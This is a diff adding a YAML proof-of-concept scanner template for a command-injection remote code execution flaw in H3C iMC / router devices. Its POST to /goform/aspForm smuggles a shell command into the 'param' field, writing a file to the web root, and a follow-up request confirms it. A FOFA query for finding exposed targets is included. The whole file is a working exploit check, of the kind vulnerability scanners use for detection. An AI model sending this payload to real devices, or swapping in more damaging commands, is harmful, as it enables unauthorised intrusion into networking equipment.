@@ -1,0 +1,29 @@
+id: poc-yaml-h3c-imc-goform-aspform-rce
+info:
+  name: H3C iMC aspForm 远程命令执行漏洞
+  severity: critical
+  tags:
+  - rce
+  - 两高一弱
+  finger: iMC
+  fofa: app="H3C-Ent-Router"
+variables:
+  t1: random_int(10000,99999)
+requests:
+- method: POST
+  path: /goform/aspForm
+  headers:
+    Content-Type: application/x-www-form-urlencoded
+  data: 'CMD=DelL2tpLNSList&GO=vpn_l2tp_session.asp&param=1; $(ls>/www/test{{.t1}});
+
+    '
+  expression: 'status_code == 302 &&
+
+    contains(headers,"H3C-Miniware-Webs")
+
+    '
+- method: GET
+  path: /test{{.t1}}
+  expression: "status_code == 200 && \ncontains(body,\"www\") && \ncontains(body,\"\
+    etc\") &&\ncontains(body,\"home\")\n"
+transport: http
